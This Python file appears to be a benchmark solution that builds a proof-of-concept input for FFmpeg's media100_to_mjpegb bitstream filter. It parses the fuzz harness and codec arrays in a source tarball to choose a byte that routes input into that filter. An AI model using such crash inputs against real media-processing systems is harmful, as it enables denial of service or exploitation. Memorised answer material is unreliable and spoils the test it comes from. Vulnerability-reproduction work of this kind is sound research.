import tarfile
import re


def _read_member_text(tar, member):
    f = tar.extractfile(member)
    if not f:
        return ""
    data = f.read()
    try:
        return data.decode("utf-8")
    except UnicodeDecodeError:
        return data.decode("latin1", errors="ignore")


def _find_harness_source(tar, target_bsf_name):
    for m in tar.getmembers():
        if not m.isfile():
            continue
        if not m.name.endswith(".c"):
            continue
        text = _read_member_text(tar, m)
        if "LLVMFuzzerTestOneInput" in text and target_bsf_name in text:
            return text
    return None


def _parse_bsf_array(harness_src, target_bsf_name):
    # Find the string literal for the target bsf name
    marker = '"' + target_bsf_name + '"'
    idx = harness_src.find(marker)
    if idx == -1:
        return None, [], None

    # Find the '=' preceding the initializer, then the '{'
    eq_pos = harness_src.rfind("=", 0, idx)
    if eq_pos == -1:
        brace_start = harness_src.rfind("{", 0, idx)
    else:
        brace_start = harness_src.find("{", eq_pos)
    if brace_start == -1:
        return None, [], None

    # Find the closing '};' after the target entry
    brace_end = harness_src.find("};", idx)
    if brace_end == -1:
        brace_end = harness_src.find("}", idx)
        if brace_end == -1:
            return None, [], None

    array_body = harness_src[brace_start + 1:brace_end]
    names = re.findall(r'"([^"]+)"', array_body)

    # Extract array variable name from declaration line
    decl_start = harness_src.rfind("\n", 0, eq_pos) + 1 if eq_pos != -1 else harness_src.rfind("\n", 0, brace_start) + 1
    decl = harness_src[decl_start:eq_pos if eq_pos != -1 else brace_start]
    m = re.search(r'(\w+)\s*\[\s*\]\s*$', decl)
    if not m:
        m = re.search(r'(\w+)\s*$', decl)
    arr_name = m.group(1) if m else None

    try:
        idx_in_list = names.index(target_bsf_name)
    except ValueError:
        idx_in_list = None

    return arr_name, names, idx_in_list


def _parse_filter_codec_ids(media_src):
    # Look for static const enum AVCodecID array initializer
    m = re.search(
        r'static\s+const\s+enum\s+AVCodecID\s+\w+\s*\[\s*\]\s*=\s*{([^}]+)};',
        media_src,
        flags=re.DOTALL,
    )
    if not m:
        return []

    body = m.group(1)
    codecs = re.findall(r'AV_CODEC_ID_[A-Z0-9_]+', body)
    # Filter out *_NONE entries
    return [c for c in codecs if not c.endswith("_NONE")]


def _parse_harness_codec_array(harness_src, allowed_codec_ids):
    pattern = re.compile(
        r'static\s+const\s+enum\s+AVCodecID\s+(\w+)\s*\[\s*\]\s*=\s*{([^}]+)};',
        re.DOTALL,
    )
    for m in pattern.finditer(harness_src):
        arr_name = m.group(1)
        body = m.group(2)
        codecs = re.findall(r'AV_CODEC_ID_[A-Z0-9_]+', body)
        if not codecs:
            continue
        intersection = [c for c in codecs if c in allowed_codec_ids]
        if intersection:
            return arr_name, codecs, intersection[0]
    return None, [], None


class Solution:
    def solve(self, src_path: str) -> bytes:
        target_bsf_name = "media100_to_mjpegb"
        desired_len = 1025

        try:
            tar = tarfile.open(src_path, "r:*")
        except Exception:
            # If we cannot open the tarball, just return a generic payload
            return b"\x00" * desired_len

        with tar:
            harness_src = _find_harness_source(tar, target_bsf_name)
            if harness_src is None:
                # Fallback: no specific harness found
                return b"\x00" * desired_len

            bsf_array_name, bsf_names, bsf_index = _parse_bsf_array(harness_src, target_bsf_name)
            if not bsf_names or bsf_index is None:
                # Fallback: cannot parse BSF list
                return b"\x00" * desired_len

            num_bsfs = len(bsf_names)

            # Parse codec IDs allowed by the media100_to_mjpegb BSF
            media_src = None
            for m in tar.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                if name.endswith("media100_to_mjpegb.c") and "/bsf/" in name:
                    media_src = _read_member_text(tar, m)
                    break

            allowed_codec_ids = []
            if media_src:
                allowed_codec_ids = _parse_filter_codec_ids(media_src)

            # Parse harness codec-id array and find a codec compatible with the BSF
            codec_array_name, codec_list, target_codec_name = _parse_harness_codec_array(
                harness_src, allowed_codec_ids
            )

            # Choose a byte value that selects both the desired BSF and a compatible codec
            if codec_list and target_codec_name:
                num_codecs = len(codec_list)
                try:
                    codec_index = codec_list.index(target_codec_name)
                except ValueError:
                    codec_index = None
                if codec_index is not None:
                    shared_val = None
                    for v in range(256):
                        if v % num_bsfs == bsf_index and v % num_codecs == codec_index:
                            shared_val = v
                            break
                    if shared_val is not None:
                        byte_val = shared_val
                    else:
                        byte_val = bsf_index % 256
                else:
                    byte_val = bsf_index % 256
            else:
                byte_val = bsf_index % 256

            # Construct the PoC: fill entire buffer with the selected byte value
            poc = bytes([byte_val]) * desired_len
            return poc
